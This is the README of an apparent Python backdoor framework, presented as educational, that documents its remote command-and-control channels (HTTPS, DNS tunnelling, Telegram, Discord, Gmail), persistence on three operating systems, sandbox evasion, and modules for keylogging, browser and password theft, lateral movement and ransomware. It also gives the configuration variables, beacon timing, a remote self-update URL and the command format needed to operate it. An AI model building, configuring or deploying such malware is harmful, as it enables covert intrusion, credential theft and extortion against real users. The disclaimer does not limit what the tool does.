# Advanced Backdoor Framework

A comprehensive, multi-protocol backdoor implementation for research and educational purposes. This framework demonstrates advanced persistence, stealth, and communication techniques used in modern malware.

> **⚠️ WARNING: This is for educational and research purposes only. Using this software for malicious activities is illegal and unethical.**

## Features

### Multi-Protocol Communication
- **HTTPS**: Encrypted communication via REST API
- **DNS Tunneling**: Covert data exfiltration through DNS queries
- **Telegram Bot**: Command and control via Telegram messages
- **Discord Webhook**: Real-time notifications and commands
- **Gmail SMTP**: Email-based communication channel

### Cross-Platform Persistence
- **Windows**: Registry keys, scheduled tasks, services, startup folder, WMI
- **Linux**: Cron jobs, systemd services, rc.local, profile scripts, SSH keys
- **macOS**: Launch agents, cron, login items

### Stealth and Anti-Analysis
- Environment detection (debuggers, virtual machines, sandboxes)
- Process hiding capabilities
- Encrypted communications
- Data compression
- Timing-based evasion techniques

### Modular Architecture
- **Shell Module**: Execute system commands
- **File Manager**: Upload/download/delete files
- **Keylogger**: Capture keystrokes
- **Screenshot**: Capture screen images
- **Browser Stealer**: Extract browser data (passwords, cookies, history)
- **Password Dumper**: Extract system credentials
- **Network Scanner**: Discover hosts and open ports
- **Privilege Escalation**: Attempt to gain higher privileges
- **Lateral Movement**: Spread to other systems
- **Ransomware**: File encryption/decryption (educational only)

## Configuration

The backdoor supports configuration through environment variables loaded from a `.env` file. This allows you to customize settings without modifying the code.

### Environment Variables

Create a `.env` file in the project root with your configuration:

```bash
# Copy the template
cp .env.example .env

# Edit with your settings
nano .env
```

### Key Configuration Options

#### C2 Server Configuration
```env
# HTTPS C2 Server
C2_HTTPS_HOST=your-c2-server.com
C2_HTTPS_PORT=443
C2_HTTPS_PATH=/api/beacon

# Telegram Bot C2
TELEGRAM_BOT_TOKEN=YOUR_TELEGRAM_BOT_TOKEN
TELEGRAM_CHAT_ID=YOUR_TELEGRAM_CHAT_ID

# Discord Webhook C2
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN

# Gmail SMTP C2
GMAIL_EMAIL=backdoor.receiver@gmail.com
GMAIL_APP_PASSWORD=YOUR_GMAIL_APP_PASSWORD
```

#### Operational Settings
```env
# Beacon timing (seconds)
BEACON_INTERVAL=30
BEACON_JITTER=0.3

# Security settings
ENCRYPT_COMMS=true
COMPRESS_DATA=true
HIDE_PROCESS=true

# Enabled modules (comma-separated)
ENABLED_MODULES=shell,file_manager,keylogger,screenshot,browser_stealer
```

#### Advanced Settings
```env
# Debug mode
DEBUG_MODE=false
LOG_LEVEL=INFO

# Persistence and stealth
ENABLE_PERSISTENCE=true
ENABLE_STEALTH_CHECKS=true

# Self-update URL
UPDATE_URL=https://your-update-server.com/backdoor_update.py
```

### Configuration Loading

The framework automatically loads environment variables from `.env` on startup. You can also reload configuration at runtime:

```python
from config import Config
Config.reload_config()  # Reload .env file
```

### Security Notes

- **Never commit `.env` files** - They contain sensitive information
- Use strong, unique credentials for each C2 channel
- Consider using encrypted environment variables for production
- Rotate credentials regularly

## Usage

### Basic Operation
```bash
python main.py
```

The backdoor will:
1. Install persistence mechanisms
2. Perform environment checks
3. Begin beaconing to configured C2 servers
4. Await and execute commands

### Command Structure
Commands are sent via configured C2 channels with the following format:
```json
{
  "command": "shell",
  "args": {
    "command": "whoami",
    "timeout": 30
  }
}
```

### Available Commands
- `shell`: Execute system commands
- `file`: File operations (upload/download/delete)
- `screenshot`: Capture screen
- `keylogger`: Start/stop keylogging
- `browser`: Steal browser data
- `passwords`: Dump system passwords
- `scan`: Network scanning
- `privesc`: Privilege escalation attempts
- `lateral`: Lateral movement
- `ransomware`: File encryption (use with extreme caution)
- `kill`: Terminate backdoor
- `update`: Update from URL
- `uninstall`: Remove persistence and exit

## Project Structure

```
backdoor/
├── main.py                 # Entry point
├── core.py                 # Main backdoor orchestration
├── config.py              # Configuration management
├── crypto.py              # Encryption/decryption utilities
├── communication/         # Multi-protocol C2 communication
│   ├── __init__.py
│   └── manager.py
├── persistence/           # Cross-platform persistence
│   ├── __init__.py
│   └── manager.py
├── stealth/               # Anti-analysis techniques
│   ├── __init__.py
│   └── manager.py
├── modules/               # Backdoor functionality modules
│   ├── __init__.py
│   └── manager.py
├── requirements.txt       # Python dependencies
└── README.md             # This file
```

### Security Features
- AES-256-CBC encryption for all communications
- Unique session keys per connection
- Data compression to minimize traffic
- Sequence numbering for command tracking
- Metadata inclusion (hostname, user, timestamp)

## Development

### Adding New Modules
1. Implement module function in `ModuleManager`
2. Add to `self.modules` dictionary
3. Include in `MODULES` configuration list

### Adding New Protocols
1. Implement `_send_<protocol>` method in `CommunicationManager`
2. Add protocol configuration to `C2_SERVERS`
3. Update protocol rotation logic

## Testing

### Safe Testing Environment
- Use isolated virtual machines
- Configure local C2 servers
- Test persistence in controlled environment
- Verify cleanup procedures

### Unit Tests
```bash
python -m pytest tests/
```

## Security Considerations

### Detection Evasion
- Random beacon intervals with jitter
- Multiple fallback communication channels
- Process name obfuscation
- Registry key randomization

### Legal and Ethical Use
This framework is provided for:
- Security research and education
- Red team training
- Malware analysis studies
- Understanding cyber threats

**Unauthorized use for malicious purposes is strictly prohibited and may violate local laws.**

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

The authors are not responsible for any misuse of this software. This tool is intended for educational purposes only in controlled environments with explicit permission.

